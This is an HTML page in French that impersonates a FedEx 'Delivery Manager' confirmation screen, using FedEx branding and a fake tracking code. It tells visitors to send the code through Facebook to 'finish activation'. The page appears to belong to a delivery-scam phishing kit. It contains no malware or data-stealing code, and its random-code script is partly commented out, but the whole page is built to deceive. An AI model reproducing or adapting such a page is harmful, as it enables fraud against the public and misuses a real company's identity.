<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/favicon.ico">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link rel="stylesheet" href="css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400;1,600&display=swap" rel="stylesheet">
    <title>Code reçu</title>
    <style>
        * {
            font-family: "Open Sans", sans-serif !important;
        }
    </style>

</head>

<body>
    <nav class="navbar navbar-expand-lg  p-3" id="navbar1">
        <div class="container">
            <a class="navbar-brand" href="#"><img src="img/logo.png" alt="Fedex" style="width: 100px;"></a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon text-white"></span>
            </button>
            <div class="collapse navbar-collapse justify-content-center" id="navbarNavAltMarkup">
                <div class="navbar-nav ">
                    <a class="nav-link text-white" aria-current="page" href="#">Expédier</a>
                    <a class="nav-link text-white" style="margin-left: 20px" href="#">Suivi</a>
                    <a class="nav-link text-white" style="margin-left: 20px" href="#">Support</a>
                    <a class="nav-link text-white" style="margin-left: 20px">Compte</a>
                </div>
            </div>
        </div>
    </nav>

    <div class="formVal mb-3">
        <div class="container d-flex justify-content-center align-items-center flex-column pt-5">
            <h1>FedEx Delivery Manager &reg;</h1>
            <p style="text-align:center;">FedEx strives to provide a safe, secure online environment for our customers.</p>
            <div class="mt-3"><img src="img/valid.png" style="width: 100px;" alt="" srcset=""></div>
            <div class="mt-3"><img src="img/barcode.jpg" style="width: 250px;" alt="" srcset=""></div>
            <p style="width: 100%; text-align: center;">Votre Code est : <span id="codeR" class="text-success">BE4758343</span></p>
            <h6 style=" text-align: center;color: black;font-size: 12px;">Envoyez nous votre code suivi <span class="text-success" style="font-style: italic;" id="codeRF">BE4758343</span> via facebook pour terminer l'activation .</h6>
        </div>
    </div>


    <div id="footer" class="text-white" style="position: absolute; bottom: 0; width: 100%; background-color: rgb(77, 20, 140);">
        <div class="container d-flex justify-content-center align-items-center flex-row p-3">

            <img src="img/logo.png" alt="Fedex" style="width: 100px;">

            <p class="m-0 ms-2">All right reserved&copy;</p>

        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js" integrity="sha384-cuYeSxntonz0PPNlHhBs68uyIAVpIIOZZ5JqeqvYYIcEL727kskC66kF92t6Xl2V" crossorigin="anonymous"></script>

    <script>
        let codeBE = document.getElementById('codeR');
        let codeBE1 = document.getElementById('codeRF');
        let numberBE = Math.floor((Math.random() * 8) + 1);
        let numberBE2 = Math.floor((Math.random() * 8) + 1);
        let numberBE3 = Math.floor((Math.random() * 8) + 1);
        let numberBE4 = Math.floor((Math.random() * 8) + 1);
        let numberBE5 = Math.floor((Math.random() * 8) + 1);
        let numberBE6 = Math.floor((Math.random() * 8) + 1);
        let numberBE7 = Math.floor((Math.random() * 8) + 1);
        let numberBE8 = Math.floor((Math.random() * 8) + 1);
        let Result = 'FDX' + numberBE + '' + numberBE2 + '' + numberBE3 + '' + numberBE4 + '' + numberBE5 + '' + numberBE6 + '' + numberBE7 + '' + numberBE8;
        // codeBE.innerHTML = Result;
        // codeBE1.innerHTML = Result;
    </script>
</body>

</html>